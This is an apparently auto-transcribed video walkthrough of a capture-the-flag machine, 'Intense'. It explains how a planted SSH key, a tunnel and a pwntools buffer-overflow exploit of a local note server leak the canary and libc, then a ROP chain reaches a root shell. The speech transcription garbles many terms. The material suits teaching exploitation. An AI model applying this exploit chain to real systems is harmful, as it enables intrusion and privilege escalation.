cat t i think that's it so we can cat t to authorize keys and shy to ssh so chmod 600 intense sh-i intense and debian s m p at 10 10 10 195 and we get permission denied public key so that did not work um i'm going to echo a blank line to authorized keys clean cat authorize keys and see what this is maybe this algorithm just it did not like the algorithm and that would be a shame uh v intense dot pub paste and we're definitely missing a lot um ntyaa missing a whole chunk like right here cat intense dot pub so let's try this one last time uh grab this echo dash n to t echo dash n 2t echo dash n 2t and you can see why i didn't want to manually do like snmp set commands now and just opted to use the shell because this is not an easy exploit to pull off okay cat t cat t to authorize keys echo to blank line so we can just do that and see if we can ssh there we go we don't have any denied but a connection immediately closes so we can't really execute commands this way but we can um do ssh tunneling so remember port 5001 uh we can do a tunnel to that so i do dash n to tell it not to execute any commands and we'll do dash capital l 5001 localhost 5001 and here we can do netcat lvnp okay netcat 127.001 5001 and we connect to the port i think yeah we're connected but nothing's really happening so um at this point i guess we just have to figure out exactly what this is we found the source and home user and there is i guess the binary right there and then nert server.c so we could probably download that binary so if we go back to view home note server a home user dot c can we okay so we could potentially base64 unless that's a directory nert server nope that's a file so cp note server or we'll do a 64 node server 2 and we'll write temp node.b64 tab node.b65 and we can save the file so copy go to a new thing v note server i'll probably should call it dot b64 base 64-d and chmod plus x inert server and now we actually have the server it says the port is already in use because we have this ssh tunnel up listing on 5001 so i'm going to kill it and we're just going to run it locally and when we connect we're not getting anything to it so at this point we probably have to enumerate this application thankfully we have the source code so we don't really have to do too much reversing so let's just look at it it was note server.c and let's find where main is so we have main and oh right at the top it did tell us how it was compiled so that's handy so let's look at main and we have some socket stuff uh let's see this is where it listens on port 5001 and then it listens only on 12701 and creates a child process by forking and that fork looks like it is handle client so let's take a look at what handle client is and the very first thing we have is it define a note with a buffer size of 1024 so there's not too much to this application if there's a stack overflow i'm guessing that's where it is because that's just screaming buffer size literally all caps and everything so we can see all the other variables that get pushed on this and then look at it so looks like we got some type of case statement so let's figure out what this is case one so if one is sent to this socket probably then let's see i guess if it doesn't conform to the message then exit make sure users are writing less than the buffer and here we go we write the note so it breaks so we should be able to write to that socket but i don't see it printing anything so let's keep on going um we have copy part of the note to the end of the note so this piece can um i guess as it says copy the note so copy a piece of the note over top um we can probably explain that more in a minute and then this last one is printing data so this explains why we couldn't get any data because we didn't send it in the correct format so in order to center the correct format we have to like do echo dash e n the e is going to let us send characters via like hex so if i just did echo dash and backslash x00 it says that but this will actually process what there we go has to be in quotes so there's the difference so we can send 0 1 and then the next thing it wanted was the buffer size so the size of the message we're going to send so i'm going to send 0 4 i'm going to say test and then we're going to call it by sending three which sends us into the case statement three and we'll do netcat localhost 5001. and that did not work let's see zero one zero four test zero three let's restart this oh i'm not doing the dash e there we go so there we go we have the server sending test back to us so we can kind of interact with the server let's create a python script to be able to send messages to each of these pieces before you look any further and i'm going to use parent tools so i'm just getting here so you can see the c code and then we'll call this um dot exploit.pi and the very first thing we'll do is from pawn import star and then the context binary will be nert server and this is just setting up gdb things they're not gdb um parent tools e is equal to context dot binary and lib c we're gonna do later so p is equal to that's process remote 127.001 5001 and this is just in there we go so we can write to the socket so right and we'll send it data and we'll do p dot send backslash x01 then p.send we got to do the padding so i'll do padding eight this is a parent tools thing blend data close that out p dot send the actual data and we could have put this all on one line but i find it easier just to break it up it doesn't really matter so this is like length of data enter right and then this will be the data so the next function will be copy and offset and size p dot send access x02 p dot send where is the offset see is offset defined anywhere it's a 16. so if you wondered why did p8 it's just you went 8 you went 16 here so just making sure our python thing sends or a c program in the exact format it wants it so instead of p8 we'll do p16 and then offset and i forgot a single quote here syntax highlighting helps so much p dot send and now we can send the size and the copy size is uint8 so p8 size and that's it for copy and then there was read and read was just we sent it um three there we go so now we have that we can start our exploit so we may be getting ahead of ourselves a little bit but the actual buffer overflow happens with the buffer size so if we look at um case one we have a check here that prevents us from writing over the buffer so every time we write a note it's just adding it and adding it so if i did this and we do backslash x 0 1 uh we'll do um five i guess and we'll say test dash if with exclamation point maybe i think that's five characters and oh shoot uh access x05 or zero one zero five test for that's four five so we sent it one message and then we sent it a another message and it gets displayed um yeah so got displayed here so this is showing that it keeps the buffer indefinitely or until the uh session dies and it will stop being written if it ever goes higher than 1024 because of this check so let's look at what they're doing to protect the buffer on case 2. um right here we have uh let's see sandy check right here prevent user right over buffer notes and it's only checking the index so it's not going to check what you copy so if for at 1024 and then we copy more we just um increase this buffer so what this attack is doing is we're saying we're filling the buffer up with 1024 characters and then we're using this copy function to tell the program it's actually longer than 1024 so that way when it reads it it reads 1024 and then some extra so that is the theory of the exploit that we're gonna try to show so let's do um log dot info stage one defeat aslr so we're going to write a times we have to go to 1024 and because the size um is just a single byte right here uh we are right here we're limited to um 0x ff which is 255 since we only have one byte to work with so i'm going to send it in five we'll do four things of 200 that's going to get us to 800. then we're going to send 224 and then i'll get to 1024. so 200 400 600 800 1024 so we just filled up the buffer so now let us copy um at 1024 and we'll take the maximum amount which is uh 255. so the offset is we just told it to go um at the very end of the buffer and then go the next 255 bytes and this copy thing may make more sense in a minute so we're going to read then we can do p dot receive 1024 and don't know too much else so let's just run this program after we compile so i'm gonna um head this note server.c thing real quick and it gave us compile instructions so gcc wall pi stack whatever i'm going to do this and i'm going to add one flag to it so we're going to add dash ggdb which is going to allow us to have ac uh use a source code when we're debugging so we just created a new program so we have um node underscore server and note server i'm just going to move node underscore server to be note local and we'll move note server to be note remote and if i do gdb on note local list we have source code so that becomes super handy um let's go into the python program again and this is going to be note um what i call it local okay we can exit or quit and we can do ldd note local and that's going to tell us where lib c is so we'll put that here so we can do v exploit and grab lib c and this can be is equal to that is that how i did it um no we needed a health like that there we go it's not important yet but i just like putting that there because i'm known to forget to set those type of environment variables and pen tools so now we should be able to python3 exploit.pi uh psef grep note let's make sure our process is dead and let's run it um gdb note local uh break main run set follow fork mode to child because we know it forks i'm going to do list zero so we're just going to go through the source code and right where the right is that's why i want to break so right here this is what i want to break on so b82 and then we can continue and when we run this exploit uh we do see stack canary found dap whatever but we're here so we can do something called telescope and we're going to say on the note variable plus 1024 if we don't do like we do that it's just going to go to a bunch of a's um if we go to 1016 which is um eight characters before 1024 you can see the very first address is going to be a's and then it goes to the actual stack so this is the data that we're reading right now so we set our offset to 1024 and then read the next uh 255. so this is what is going to get sent to a python program i don't know what this is this is going to be a stat canary we could debug and step through this more but just before rbp if there's a stat canary that's what this is going to be um we got rbp this is going to be the return address and this is going to be location of base so i'm going to kill my program and i know we're doing this buffer overflow super fast um this video is long i don't know what else to say uh let's do p dot receive eight and this is junk then we got canary is equal to the next eight right and then after the canary what did we say it was rbp so we got rbp is equal to p dot receive eight then we have um after rbp there's gonna be the return address and then we got the base address so we have a bunch of information right here we can do a log right here log dot success and this will be canary and that is u64 what if we do um let's see we should do u64 unpack 64-bit there we go uh u64 do that on all these use 64. let's fix this real quick um there we go so now i have syntax highlighting it always irks me when i break syntax highlighting q64 there so we should now be able to print um canary like that let's see what happens when we run this probably going to be some type of error let's see junk remote object has no attribute rev receive there we go and we have the canary here we can print it out in hex format to make it a bit easier and all we do is put hex before it so canary it's going to be hex like that and now when we run this the canary is printed well we have to get the base address and we can also do that in this telescope thing i believe so go back here um this is the address we want so i'm just going to do x backslash x uh copy this address and we'll subtract it from the base and can't access memory oh because we terminated it uh we can't access it again but it gave us the number we want one six seven four so that's going to be the difference and this is going to change on different binaries so when we go back to do it remote we have to remember to change this i say that but i know i'm not going to do it so we can do e dot address is equal to ret minus 0x1674 and that e is right here where i did context binary so this should be the location of where the program is um so we can begin stage two now and what that is i mean um aslr is going to change where it loads every time so let's say this is where our program is and we know every time doesn't matter where it is as soon as we find o we know we go back three and we hit p so even if the stack like loaded the program back here and we get this address of o which is what we did we go back we find p and now we can find all the other ones so again that's all we did with this piece so stage two this is where it's going to get tricky we're going to have to um do a rope chain so i'm going to go back up here and we're going to do def exploit and because um of the whole copy thing that's why i'm doing it this way uh this was copies gonna make sense so exploit and we're going to send it the um rop and canary we can do variables like this because that's the order they will go so payload is going to equal eight pieces of junk and the reason why we're doing eight is because we did 1024 so let's go back to this telescope is it going to let me it is sweet so we are right here and we want to write this data so i'm writing junk on this one then we're going to put the canary then we're going to write junk here then we're going to write the address of where a rock chain is here so that's the first junk so payload plus equals now p64 we're going to pack this back up canary then we're going to um if i do plus equals that would help p64 rbp we don't have to put the correct uh base pointer but yeah we could have done all a's but it always helps to do things as legit as possible um p64 this is going to be um actually the raw so this is bytes drop so a rock chain in there and then we're going to um put some junk in and that's going to get us back up to the 200 characters just so we can save on math later because we always have to write 1024 to the chain so we're gonna do a uh what i do a times the length uh 200 minus the length of a rope chain or a payload so there's that i think that's correct hopefully it is and now we can write payload plus junk and hopefully this is equal to 200 and then we can just write the a times 200 a few times so 200 400 600 800 and this is going to be come on vim oh my god there we go that's gonna be 1024 so this is 200 and length so 2 4 6 8 10 24 awesome uh the next thing we do is we have to copy so we copy zero and then length of payload and what that just did is instead of copying out 1024 which was the very end of our payload to copy the next bytes afterwards we're just going to copy at the very beginning and where the very beginning is that's where a rock chain is so we just put a rock chain plus enough a's to get to 1024 and now we're using this copy command to go back to the original payload copy that piece of rock chain and put it on the stack so that's what that copy does and after copy we can read and then let's um just for handysakes let's go up to exactly where we are so after it runs this exploit we're going to receive 1024 because that's the a's then we're going to skip ahead of all a rock chain and that should be kind of where the output of the stuff is if we did everything correct so stage two we have to reconnect and the canary and everything is going to stay the same until the server gets reverted or rebooted um that stuff happens as soon as it boots so in parent tools i'm now creating rock chains out of the binary which is note server and we're going to create a rop chain linking the procedural linkage table of the right so this is going to write it back to us um the socket of where we are let's see rdi is4 and we're inside the cha fork so most likely that's the file descriptor so writing to file descriptor 4 and then on the global offset table we're going to link read and read is a function within lib c so if we link the address to where read is in lib c we can do exactly what we did with main and find out where the beginning of lib c is once we know where the beginning of lib c is we can find all the functions no problem so that's what that is doing here and we do exploit and then canary drop and if all goes well uh reed is going to be the next eight bytes and then we can do libc dot address is equal to read leak minus libc dot sim read and then we can go over to stage 3 execute code this is going to be find libsy so this to beat aslr find lib c and then stage three stage two uh this is stage three earn all the things and rename this to two and this is going to be pretty easy um since we already did the rock chain once all we have to do is create a different drop chain so this time we can do rop is equal to rop lib c and then we do bin sh is equal to find where lib sh is in lib c it's just a string so that's how you find that and then we do rop dupe two four zero uh one two so what this is doing is setting standard out in an error message to file descriptor 4 and then we just have to call exec ve which is rob.execv and we'll do bin sh 0 and exploit canary drop and drop to interactive so if we did everything correct which i don't think we did we should get a shell oh we did so we have a shell here um it's not going to get us a shell on the remote server because we have a few things we have to take we have to get libsy and we also have to find the address of um main so let's just quit this and um be happy it worked so kill one eight four eight five four oh man it's a high pid so where's snmp shell here it is uh is this where nerd server is it is so note server and let's just copy libsy right here so we can do base64 this to libc.b64 or temp libc.b64 so we copied that and we have to download it so we can go back over to burp suite and download it this is going to be much bigger than the note so we probably want to save this so copy to file and we'll call this libc.b64 and we can go back to this pane base64-d libsy.b64 to lib c uh v libc b64 just get rid of the http header there we go that is an elf that is good so here i'm just going to comment this out and i'm just going to put dot slash lib c so now it's going to pull from that and then we also have to do uh note remote and we have to get the address um of where we are so let's do dot slash note remote and unfortunately we're not going to be able to um whoops do the trick of just setting a line break on the right immediately because um actually we may be able to uh do we have this as handle client sweet we can it's not stripped so we need to set the break right here so let's do b stir this uh we'll do break on main as well we can run the program uh it doesn't like something i'm just going to break main run the program then we'll do dis as uh do we still have it here what was the thing handle client and we can break i don't even know why i ever recompiled it without this being stripped it's pretty easy to work with so we can do um set follow fork mode child run i should have done continue shoot uh we'll see if it works still if i still break okay i broke right on the right we can telescope note plus 1024. oh shoot um because we don't have the source it doesn't know exactly what variable note is so let's see um [Music] telescope rsi plus 1024 let's see maybe xlsx rsi plus 1.024 c then plus eight is this going to be the canary then is this it i think this is where maine is so we had junk canaries location rbp and then this is the return address so we got it working um so we could do that minus uh shoot we have to do c paste that there just so i have it uh vm app and what is it i think we are this one is that it can we do minus does gdb work like that print no um is that it see where is my main so we're here uh let's actually just continue and see what a program said because we should be able to actually do this i wasn't thinking but um my program should link leak main so return right here this before doing anything so we can just do log dot success and this will be return hex ret uh hex wrap like that and now when we run this again we get the return address of i think what we had oh i just missed a bunch of um stuff i actually been doing in like 16 maybe python 3 print see which one's bigger think this one's bigger minus this if we do hex that doesn't look right let's try doing via map again uh we have to run it and i'm just going to grab this address i think i grabbed this one before i don't know why i did that let's try this one [Music] paste it here and we can do hex there we go f54 this is what we want that looks better um so let's v exploit.pi and where is that one piece it was like 1 6 we did 1 6 something there we go this e dot address is going to be f 5 4 right uh yep f54 okay so now all that's left to do is um stir up the reverse shell or the tunnel so pgrep note psef grab note kill note remote uh p kill note remote so now we're not listening on the socket and we can do ssh dash i um what is it what is ssh key intense debian snmp i think at 10 10 10 195. it's going to go yep so now we can say dash capital l 5001 localhost 5001. uh we have to do dash capital n as well and now we can run exploit.pi and if all goes well it'll work id we are root hostname intense so we did it with a buffer overflow so we can get root.text and call it a day hope you guys enjoyed the video take care and i will see you all next week